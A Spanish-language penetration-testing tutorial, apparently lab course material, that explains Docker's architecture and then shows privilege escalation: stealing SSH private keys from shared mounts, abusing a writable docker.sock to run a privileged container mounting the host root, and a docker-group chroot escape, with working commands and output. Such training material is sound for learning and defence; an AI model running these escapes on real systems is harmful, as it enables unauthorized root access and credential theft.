Docker es una herramienta open-source popular que proporciona un entorno de ejecución portátil y consistente para aplicaciones de software. Utiliza contenedores como entornos aislados en el espacio de usuario que se ejecutan a nivel del sistema operativo y comparten el sistema de archivos y los recursos del sistema. Una ventaja es que la contenedorización consume significativamente menos recursos que un servidor tradicional o una máquina virtual. La característica principal de Docker es que las aplicaciones están encapsuladas en los llamados contenedores Docker (Docker containers). Así, pueden ser utilizadas en cualquier sistema operativo. Un contenedor Docker representa un paquete de software ejecutable autónomo y ligero que contiene todo lo necesario para ejecutar una aplicación: código, runtime.

---

## Docker Architecture

En el núcleo de la arquitectura de Docker se encuentra un modelo cliente-servidor, donde tenemos dos componentes principales:

- El Docker daemon
- El Docker client

El Docker client actúa como nuestra interfaz para emitir comandos e interactuar con el ecosistema Docker, mientras que el Docker daemon es responsable de ejecutar esos comandos y gestionar los contenedores.

### Docker Daemon

El `Docker Daemon`, también conocido como el servidor Docker, es una parte crítica de la plataforma Docker que desempeña un papel fundamental en la gestión y orquestación de contenedores. Piensa en el Docker Daemon como el motor detrás de Docker. Tiene varias responsabilidades esenciales como:

- Ejecutar contenedores Docker
    
- Interactuar con contenedores Docker
    
- Gestionar contenedores Docker en el sistema host.
    

### Managing Docker Containers

Primero, maneja la funcionalidad principal de la contenedorización. Coordina la creación, ejecución y monitoreo de contenedores Docker, manteniendo su aislamiento del host y otros contenedores. Este aislamiento asegura que los contenedores operen independientemente, con sus propios sistemas de archivos, procesos e interfaces de red. Además, maneja la gestión de imágenes Docker. Descarga imágenes de registros, como [Docker Hub](https://hub.docker.com/) o repositorios privados, y las almacena localmente. Estas imágenes sirven como bloques de construcción para crear contenedores.

Adicionalmente, el Docker Daemon ofrece capacidades de monitoreo y registro, por ejemplo:

- Captura registros de contenedores
    
- Proporciona información sobre actividades de contenedores, errores e información de depuración.
    

El Daemon también monitorea la utilización de recursos, como CPU, memoria y uso de la red, permitiéndonos optimizar el rendimiento de los contenedores y resolver problemas.

### Network and Storage

Facilita la creación de redes de contenedores creando redes virtuales y gestionando interfaces de red. Permite a los contenedores comunicarse entre sí y con el mundo exterior a través de puertos de red, direcciones IP y resolución de DNS. El Docker Daemon también desempeña un papel crítico en la gestión del almacenamiento, ya que maneja volúmenes Docker, que se utilizan para persistir datos más allá de la vida útil de los contenedores y gestiona la creación, anexado y limpieza de volúmenes, permitiendo a los contenedores compartir o almacenar datos independientemente unos de otros.

### Docker Clients

Cuando interactuamos con Docker, emitimos comandos a través del `Docker Client`, que se comunica con el Docker Daemon (a través de una `RESTful API` o un `Unix socket`) y sirve como nuestro medio principal de interacción con Docker. También tenemos la capacidad de crear, iniciar, detener, gestionar, eliminar contenedores, buscar y descargar imágenes Docker. Con estas opciones, podemos descargar imágenes existentes para usar como base para nuestros contenedores o construir nuestras propias imágenes usando Dockerfiles. Tenemos la flexibilidad de subir nuestras imágenes a repositorios remotos, facilitando la colaboración y el intercambio dentro de nuestros equipos o con la comunidad en general.

En comparación, el Daemon, por otro lado, lleva a cabo las acciones solicitadas, asegurando que los contenedores se creen, inicien, detengan y eliminen según sea necesario.

Otro cliente para Docker es `Docker Compose`. Es una herramienta que simplifica la orquestación de múltiples contenedores Docker como una sola aplicación. Nos permite definir la arquitectura multi-contenedor de nuestra aplicación utilizando un archivo declarativo `YAML` (`.yaml`/`.yml`). Con él, podemos especificar los servicios que componen nuestra aplicación, sus dependencias y sus configuraciones. Definimos imágenes de contenedores, variables de entorno, redes, enlaces de volúmenes y otras configuraciones. Docker Compose luego asegura que todos los contenedores definidos se inicien e interconecten, creando una pila de aplicaciones cohesiva y escalable.

### Docker Desktop

`Docker Desktop` está disponible para los sistemas operativos MacOS, Windows y Linux y nos proporciona una GUI fácil de usar que simplifica la gestión de contenedores y sus componentes. Esto nos permite monitorear el estado de nuestros contenedores, inspeccionar registros y gestionar los recursos asignados a Docker. Proporciona una forma intuitiva y visual de interactuar con el ecosistema Docker, haciéndolo accesible a desarrolladores de todos los niveles de experiencia, y adicionalmente, soporta Kubernetes.

---

## Docker Images and Containers

Piensa en una `Docker image` como un plano o una plantilla para crear contenedores. Encapsula todo lo necesario para ejecutar una aplicación, incluyendo el código de la aplicación, dependencias, bibliotecas y configuraciones. Una imagen es un paquete autocontenido y de solo lectura que asegura consistencia y reproducibilidad en diferentes entornos. Podemos crear imágenes usando un archivo de texto llamado `Dockerfile`, que define los pasos e instrucciones para construir la imagen.

Un `Docker container` es una instancia de una imagen Docker. Es un entorno ligero, aislado y ejecutable que ejecuta aplicaciones. Cuando lanzamos un contenedor, se crea a partir de una imagen específica, y el contenedor hereda todas las propiedades y configuraciones definidas en esa imagen. Cada contenedor opera independientemente, con su propio sistema de archivos, procesos e interfaces de red. Este aislamiento asegura que las aplicaciones dentro de los contenedores permanezcan separadas del sistema host subyacente y otros contenedores, previniendo conflictos e interferencias.

Mientras que las `imágenes` son inmutables y de `solo lectura`, los `contenedores` son mutables y pueden ser modificados durante el tiempo de ejecución. Podemos interactuar con los contenedores, ejecutar comandos dentro de ellos, monitorear sus registros e incluso hacer cambios en su sistema de archivos o entorno. Sin embargo, cualquier modificación hecha en el sistema de archivos de un contenedor no se persiste a menos que se guarde explícitamente como una nueva imagen o se almacene en un volumen persistente.

---

## Docker Privilege Escalation

Lo que puede suceder es que obtengamos acceso a un entorno donde encontraremos usuarios que pueden gestionar contenedores Docker. Con esto, podríamos buscar formas de usar esos contenedores Docker para obtener privilegios más altos en el sistema objetivo. Podemos usar varias formas y técnicas para escalar nuestros privilegios o escapar del contenedor Docker.

### Docker Shared Directories

Cuando usamos Docker, los directorios compartidos (montajes de volúmenes) pueden cerrar la brecha entre el sistema host y el sistema de archivos del contenedor. Con directorios compartidos, se pueden hacer accesibles dentro del contenedor directorios o archivos específicos en el sistema host. Esto es increíblemente útil para persistir datos, compartir código y facilitar la colaboración entre entornos de desarrollo y contenedores Docker. Sin embargo, siempre depende de la configuración del entorno y los objetivos que los administradores quieran lograr. Para crear un directorio compartido, se especifica una ruta en el sistema host y una ruta correspondiente dentro del contenedor, creando un enlace directo entre las dos ubicaciones.

Los directorios compartidos ofrecen varias ventajas, incluyendo la capacidad de persistir datos más allá de la vida útil de un contenedor, simplificar el intercambio de código y desarrollo, y permitir la colaboración dentro de los equipos. Es importante notar que los directorios compartidos pueden montarse como de solo lectura o de lectura-escritura, dependiendo de los requisitos específicos del administrador. Cuando se montan como de solo lectura, las modificaciones hechas dentro del contenedor no afectarán al sistema host, lo cual es útil cuando se prefiere acceso de solo lectura para prevenir modificaciones accidentales.

Cuando obtenemos acceso al contenedor Docker y lo enumeramos localmente, podríamos encontrar directorios adicionales (no estándar) en el sistema de archivos del Docker.

```r
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

Desde aquí, podríamos copiar el contenido de la clave SSH privada al archivo `cry0l1t3.priv` y usarlo para iniciar sesión como el usuario `cry0l1t3` en el sistema host.

```r
ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

### Docker Sockets

Un socket Docker o Docker daemon socket es un archivo especial que nos permite a nosotros y a los procesos comunicarse con el Docker daemon. Esta comunicación ocurre a través de un socket Unix o un socket de red, dependiendo de la configuración de nuestro Docker. Actúa como un puente, facilitando la comunicación entre el cliente Docker y el Docker daemon. Cuando emitimos un comando a través del Docker CLI, el cliente Docker envía el comando al socket Docker, y el Docker daemon, a su vez, procesa el comando y lleva a cabo las acciones solicitadas.

No obstante, los sockets Docker requieren permisos apropiados para asegurar la comunicación segura y prevenir el acceso no autorizado. El acceso al socket Docker típicamente está restringido a usuarios específicos o grupos de usuarios, asegurando que solo individuos de confianza puedan emitir comandos e interactuar con el Docker daemon. Al exponer el socket Docker sobre una interfaz de red

, podemos gestionar Docker hosts remotamente, emitir comandos y controlar contenedores y otros recursos. Este acceso a la API remota amplía las posibilidades para configuraciones Docker distribuidas y escenarios de gestión remota. Sin embargo, dependiendo de la configuración, hay muchas formas en las que los procesos o tareas automatizadas pueden ser almacenadas. Esos archivos pueden contener información muy útil para nosotros que podemos usar para escapar del contenedor Docker.

```r
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

Desde aquí, podemos usar el `docker` para interactuar con el socket y enumerar qué contenedores Docker ya están ejecutándose. Si no está instalado, entonces podemos descargarlo [aquí](https://master.dockerproject.org/linux/x86_64/docker) y subirlo al contenedor Docker.

```r
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos crear nuestro propio contenedor Docker que mapea el directorio raíz del host (`/`) al directorio `/hostsystem` en el contenedor. Con esto, obtendremos acceso completo al sistema host. Por lo tanto, debemos mapear estos directorios de acuerdo y usar la imagen Docker `main_app`.

```r
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Ahora, podemos iniciar sesión en el nuevo contenedor Docker privilegiado con el ID `7ae3bcc818af` y navegar al `/hostsystem`.

```r
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

Desde allí, nuevamente podemos intentar obtener la clave SSH privada e iniciar sesión como root o como cualquier otro usuario en el sistema con una clave SSH privada en su carpeta.

### Docker Group

Para ganar privilegios de root a través de Docker, el usuario con el que estamos conectados debe estar en el grupo `docker`. Esto le permite usar y controlar el Docker daemon.

```r
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternativamente, Docker puede tener SUID configurado, o estamos en el archivo Sudoers, lo cual nos permite ejecutar `docker` como root. Las tres opciones nos permiten trabajar con Docker para escalar nuestros privilegios.

La mayoría de los hosts tienen una conexión directa a Internet porque las imágenes base y los contenedores deben ser descargados. Sin embargo, muchos hosts pueden estar desconectados de Internet por la noche y fuera del horario laboral por razones de seguridad. Sin embargo, si estos hosts están ubicados en una red donde, por ejemplo, un servidor web debe pasar, aún se puede acceder a él.

Para ver qué imágenes existen y a cuáles podemos acceder, podemos usar el siguiente comando:

```r
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

### Docker Socket

Un caso que también puede ocurrir es cuando el socket Docker es escribible. Usualmente, este socket se encuentra en `/var/run/docker.sock`. Sin embargo, la ubicación puede ser comprensiblemente diferente. Porque básicamente, esto solo puede ser escrito por el root o el grupo docker. Si actuamos como un usuario, no en uno de estos dos grupos, y el socket Docker aún tiene los privilegios para ser escribible, entonces aún podemos usar este caso para escalar nuestros privilegios.

```r
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```